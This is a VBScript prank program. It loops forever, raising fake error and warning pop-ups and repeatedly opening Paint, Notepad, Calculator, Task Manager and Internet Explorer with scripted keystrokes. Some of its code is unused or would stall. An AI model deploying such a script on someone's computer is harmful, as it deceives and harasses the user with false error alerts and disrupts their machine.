Set objShell = WScript.CreateObject("WScript.Shell")

While True
    xPos = Int((1919 - 0 + 1) * Rnd + 0)
    yPos = Int((1079 - 0 + 1) * Rnd + 0)

    objShell.Run "cmd /c msg * ERROR", 0, True
    WScript.Sleep 500
    objShell.AppActivate "ERROR"
    objShell.SendKeys "%{F4}"

    objShell.Run "cmd /c msg * WARNING", 0, True
    WScript.Sleep 500
    objShell.AppActivate "WARNING"
    objShell.SendKeys "%{F4}"

    objShell.Run "cmd /c msg * CRITICAL ERROR", 0, True
    WScript.Sleep 500
    objShell.AppActivate "CRITICAL ERROR"
    objShell.SendKeys "%{F4}"

    objShell.Run "cmd /c msg * FATAL ERROR", 0, True
    WScript.Sleep 500
    objShell.AppActivate "FATAL ERROR"
    objShell.SendKeys "%{F4}"

    WScript.Sleep 500
    objShell.SendKeys "{ESC}"

    objShell.Run "mspaint.exe", 0, True
    WScript.Sleep 500
    objShell.AppActivate "untitled - Paint"
    WScript.Sleep 500
    objShell.SendKeys "^v"
    WScript.Sleep 500
    objShell.SendKeys "%{F4}"

    objShell.Run "notepad.exe", 0, True
    WScript.Sleep 500
    objShell.AppActivate "Untitled - Notepad"
    WScript.Sleep 500
    objShell.SendKeys "This is a fake error message!"
    WScript.Sleep 500
    objShell.SendKeys "{ENTER}"
    WScript.Sleep 500
    objShell.SendKeys "{ENTER}"
    WScript.Sleep 500
    objShell.SendKeys "{ENTER}"
    WScript.Sleep 500
    objShell.SendKeys "%{F4}"

    objShell.Run "calc.exe", 0, True
    WScript.Sleep 500
    objShell.AppActivate "Calculator"
    WScript.Sleep 500
    objShell.SendKeys "{ESC}"

    objShell.Run "taskmgr.exe", 0, True
    WScript.Sleep 500
    objShell.AppActivate "Task Manager"
    WScript.Sleep 500
    objShell.SendKeys "^+{ESC}"

    objShell.Run "notepad.exe", 0, True
    WScript.Sleep 500
    objShell.AppActivate "Untitled - Notepad"
    WScript.Sleep 500
    objShell.SendKeys "This is a fake warning message!"
    WScript.Sleep 500
    objShell.SendKeys "{ENTER}"
    WScript.Sleep 500
    objShell.SendKeys "{ENTER}"
    WScript.Sleep 500
    objShell.SendKeys "{ENTER}"
    WScript.Sleep 500
    objShell.SendKeys "%{F4}"

    objShell.Run "iexplore.exe www.google.com", 0, True
    WScript.Sleep 500
    objShell.AppActivate "Google - Internet Explorer"
    WScript.Sleep 500
    objShell.SendKeys "^w"

    WScript.Sleep 5000
Wend
